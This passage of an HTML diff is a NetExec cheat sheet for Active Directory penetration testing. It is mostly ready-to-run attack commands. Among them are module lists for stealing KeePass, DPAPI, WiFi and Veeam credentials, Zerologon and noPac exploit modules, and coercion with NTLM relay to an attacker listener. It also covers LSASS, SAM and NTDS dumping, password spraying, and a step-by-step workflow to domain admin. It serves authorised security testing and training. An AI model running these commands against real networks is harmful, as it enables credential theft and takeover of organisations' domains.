+  <div class="card"><h5>keepass_discover</h5><p>Locate KeePass databases + config on shares.</p></div>
+  <div class="card"><h5>keepass_trigger</h5><p>Add a malicious trigger to KeePass config → next open dumps DB in cleartext.</p></div>
+  <div class="card"><h5>wireless / wifi</h5><p>Pull saved WiFi credentials (PSK) from the host.</p></div>
+  <div class="card"><h5>dpapi</h5><p>Decrypt DPAPI blobs (browser saved passwords, RDP creds) using masterkeys.</p></div>
+  <div class="card"><h5>veeam</h5><p>Extract stored creds from Veeam Backup &amp; Replication DB.</p></div>
+  <div class="card"><h5>iis</h5><p>Dump IIS app pool creds &amp; encrypted web.config sections.</p></div>
+</div>
+
+<h3>Enum / recon modules</h3>
+<div class="card-grid">
+  <div class="card"><h5>spider_plus</h5><p>Recursive share crawler with filters, hashing, metadata — replaces old <code>--spider</code>.</p></div>
+  <div class="card"><h5>enum_av</h5><p>Detect AV / EDR product running.</p></div>
+  <div class="card"><h5>enum_dns</h5><p>Enumerate DNS records over LDAP.</p></div>
+  <div class="card"><h5>subnets</h5><p>Discover internal subnets registered in AD Sites &amp; Services.</p></div>
+  <div class="card"><h5>user-desc</h5><p>Read the <code>description</code> field on user accounts — passwords hide here.</p></div>
+  <div class="card"><h5>adcs</h5><p>List AD Certificate Services CAs and templates.</p></div>
+  <div class="card"><h5>pso</h5><p>Read Fine-Grained Password Policies.</p></div>
+  <div class="card"><h5>whoami</h5><p>LDAP "whoami" — shows how the DC sees your session (memberships, SIDs).</p></div>
+</div>
+
+<h3>Action modules (attack / privilege)</h3>
+<div class="card-grid">
+  <div class="card"><h5>add_computer</h5><p>Add a machine account (default quota 10) — building block for RBCD attacks.</p></div>
+  <div class="card"><h5>change-password</h5><p>Force-change a user's password (needs the right).</p></div>
+  <div class="card"><h5>install_elevated</h5><p>Check if <code>AlwaysInstallElevated</code> is set → any user → SYSTEM via MSI.</p></div>
+  <div class="card"><h5>zerologon</h5><p>Check + optionally exploit CVE-2020-1472.</p></div>
+  <div class="card"><h5>nopac</h5><p>Check + exploit CVE-2021-42278 / CVE-2021-42287 (sAMAccountName spoofing).</p></div>
+  <div class="card"><h5>petitpotam</h5><p>Coerce authentication via EFSRPC — use with <code>ntlmrelayx</code>.</p></div>
+  <div class="card"><h5>coerce_plus</h5><p>All-in-one coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce…).</p></div>
+  <div class="card"><h5>printerbug</h5><p>Coerce via MS-RPRN (SpoolSample).</p></div>
+  <div class="card"><h5>drop-sc</h5><p>Drop a shortcut file into a share — triggers auth on open.</p></div>
+</div>
+
+<h3>Common option-passing patterns</h3>
+<pre><span class="cmt"># Dump LSASS with lsassy and parse</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">lsassy</span>
+
+<span class="cmt"># LAPS read (needs perms on ms-Mcs-AdmPwd / msLAPS-Password)</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">laps</span>
+
+<span class="cmt"># Decrypt GPP cpassword from every reachable SYSVOL</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">gpp_password</span>
+
+<span class="cmt"># Add a computer account (default quota lets any user add 10)</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> \
+    <span class="flag">-M</span> <span class="str">add_computer</span> <span class="flag">-o</span> <span class="str">NAME=PWN$</span> <span class="str">PASSWORD='Pwn3d!'</span>
+
+<span class="cmt"># Zerologon check (safe by default)</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">''</span> <span class="flag">-p</span> <span class="str">''</span> <span class="flag">-M</span> <span class="str">zerologon</span></pre>
+
+</section>
+
+
+<!-- ============ KERBEROS ============ -->
+<section id="kerberos">
+<h2><span class="num">09</span>Kerberos usage</h2>
+
+<h3>Prereqs on the attacker box</h3>
+<pre><span class="cmt"># Time sync with the DC — Kerberos hates clock skew &gt; 5 min</span>
+<span class="cmd">sudo ntpdate</span> <span class="var">DC-IP</span>
+
+<span class="cmt"># DC as DNS resolver (or add to /etc/hosts)</span>
+<span class="cmt">echo "10.10.10.5 DC01.corp.local corp.local" | sudo tee -a /etc/hosts</span>
+
+<span class="cmt"># /etc/krb5.conf minimal entry</span>
+<span class="cmt">[realms]</span>
+<span class="cmt">    CORP.LOCAL = {</span>
+<span class="cmt">        kdc = DC01.corp.local</span>
+<span class="cmt">    }</span></pre>
+
+<h3>Getting &amp; using tickets</h3>
+<pre><span class="cmt"># Request a TGT with password</span>
+<span class="cmd">impacket-getTGT</span> <span class="str">corp.local/user:'pass'</span>
+<span class="cmd">export</span> KRB5CCNAME=<span class="str">$(pwd)/user.ccache</span>
+
+<span class="cmt"># Use the ticket with nxc</span>
+<span class="cmd">nxc smb</span> <span class="var">dc01.corp.local</span> <span class="flag">--use-kcache</span>
+
+<span class="cmt"># Or let nxc handle everything with -k</span>
+<span class="cmd">nxc smb</span> <span class="var">dc01.corp.local</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-k</span>
+
+<span class="cmt"># Kerberos with hash → overpass-the-hash</span>
+<span class="cmd">impacket-getTGT</span> <span class="str">corp.local/user</span> <span class="flag">-hashes</span> <span class="str">:NTHASH</span></pre>
+
+<p class="tip">Always use the DC's <strong>hostname/FQDN</strong> as the target, not the IP, when using <code>-k</code> — Kerberos SPNs are hostname-based.</p>
+</section>
+
+
+<!-- ============ COERCION ============ -->
+<section id="coercion">
+<h2><span class="num">10</span>Coercion + NTLM relay</h2>
+
+<p>The classic combo: force a Windows machine to authenticate to a box you control, then relay that auth somewhere useful (LDAP, ADCS, SMB signing-off host).</p>
+
+<h3>Attacker side (impacket)</h3>
+<pre><span class="cmt"># Relay to LDAP → add a computer / RBCD</span>
+<span class="cmd">impacket-ntlmrelayx</span> <span class="flag">-t</span> <span class="str">ldaps://DC-IP</span> <span class="flag">--delegate-access</span> <span class="flag">--no-smb-server</span> <span class="flag">--http-port</span> <span class="str">80</span>
+
+<span class="cmt"># Relay to ADCS Web Enrollment (ESC8) → cert as victim</span>
+<span class="cmd">impacket-ntlmrelayx</span> <span class="flag">-t</span> <span class="str">http://CA-IP/certsrv/certfnsh.asp</span> <span class="flag">--adcs</span> <span class="flag">--template</span> <span class="str">DomainController</span>
+
+<span class="cmt"># Relay to SMB (signing must be OFF on target)</span>
+<span class="cmd">impacket-ntlmrelayx</span> <span class="flag">-t</span> <span class="str">smb://TARGET</span> <span class="flag">-smb2support</span> <span class="flag">-c</span> <span class="str">'whoami'</span></pre>
+
+<h3>Trigger side (nxc)</h3>
+<pre><span class="cmt"># PetitPotam (EFSRPC) — coerce DC$ to auth to attacker</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">petitpotam</span> <span class="flag">-o</span> <span class="str">LISTENER=ATTACKER-IP</span>
+
+<span class="cmt"># All-in-one — tries every known coerce method</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">coerce_plus</span> <span class="flag">-o</span> <span class="str">LISTENER=ATTACKER-IP</span>
+
+<span class="cmt"># PrinterBug (Spool RPC)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">printerbug</span> <span class="flag">-o</span> <span class="str">LISTENER=ATTACKER-IP</span></pre>
+</section>
+
+
+<!-- ============ WORKFLOWS ============ -->
+<section id="workflows">
+<h2><span class="num">11</span>Realistic workflows</h2>
+
+<h3>New subnet, zero context</h3>
+<pre><span class="cmt"># 1. Fingerprint everything — hostname, OS, signing, SMBv1</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span>
+
+<span class="cmt"># 2. Null / guest sessions — free info</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">''</span> <span class="flag">-p</span> <span class="str">''</span> <span class="flag">--shares</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">guest</span> <span class="flag">-p</span> <span class="str">''</span> <span class="flag">--rid-brute</span>
+
+<span class="cmt"># 3. Check for the obvious CVE-2020-1472</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">''</span> <span class="flag">-p</span> <span class="str">''</span> <span class="flag">-M</span> <span class="str">zerologon</span></pre>
+
+<h3>First domain user in hand → full AD picture</h3>
+<pre><span class="cmt"># 1. Grab the policy so you don't lock accounts</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--pass-pol</span>
+
+<span class="cmt"># 2. Dump users, roast SPNs and preauth-less users</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--users</span> <span class="flag">-o</span> <span class="str">users.txt</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--kerberoasting</span> <span class="str">kerb.txt</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--asreproast</span> <span class="str">asrep.txt</span>
+
+<span class="cmt"># 3. Loot low-hanging fruit</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">gpp_password</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">user-desc</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">laps</span>
+
+<span class="cmt"># 4. Feed BloodHound</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> \
+    <span class="flag">--bloodhound</span> <span class="flag">--collection</span> <span class="str">All</span> <span class="flag">--dns-server</span> <span class="var">DC-IP</span>
+
+<span class="cmt"># 5. Spray creds across the domain (find reuse)</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--continue-on-success</span></pre>
+
+<h3>Local admin somewhere → escalate to DA</h3>
+<pre><span class="cmt"># 1. Confirm scope of the admin creds — where do they reach?</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--local-auth</span> <span class="flag">--continue-on-success</span>
+
+<span class="cmt"># 2. Dump creds on every Pwn3d! host</span>
+<span class="cmd">nxc smb</span> <span class="var">pwned.txt</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--local-auth</span> <span class="flag">--sam</span> <span class="flag">--lsa</span>
+<span class="cmd">nxc smb</span> <span class="var">pwned.txt</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--local-auth</span> <span class="flag">-M</span> <span class="str">lsassy</span>
+
+<span class="cmt"># 3. Anywhere a Domain Admin was logged in → their hash is now in your loot</span>
+<span class="cmt"># 4. Use it against the DC</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">Administrator</span> <span class="flag">-H</span> <span class="str">&lt;DA_NTHASH&gt;</span> <span class="flag">--ntds</span></pre>
+
+<h3>Password spraying safely</h3>
+<pre><span class="cmt"># 1. Get policy: LockoutThreshold, LockoutWindow, PasswordHistory</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--pass-pol</span>
+
+<span class="cmt"># 2. Enumerate valid users (RID brute or LDAP)</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--active-users</span>
+
+<span class="cmt"># 3. Spray ONE well-chosen password across ALL users, add jitter</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">users.txt</span> <span class="flag">-p</span> <span class="str">'Summer2026!'</span> \
+    <span class="flag">--continue-on-success</span> <span class="flag">--jitter</span> <span class="str">3</span></pre>
+
+</section>
+
+</main>
+
+<footer>
+  NetExec docs: <a href="https://www.netexec.wiki" target="_blank">netexec.wiki</a> · repo: <a href="https://github.com/Pennyw0rth/NetExec" target="_blank">github.com/Pennyw0rth/NetExec</a> · use only against systems you're authorized to test
+</footer>
+
+</body>
+</html>
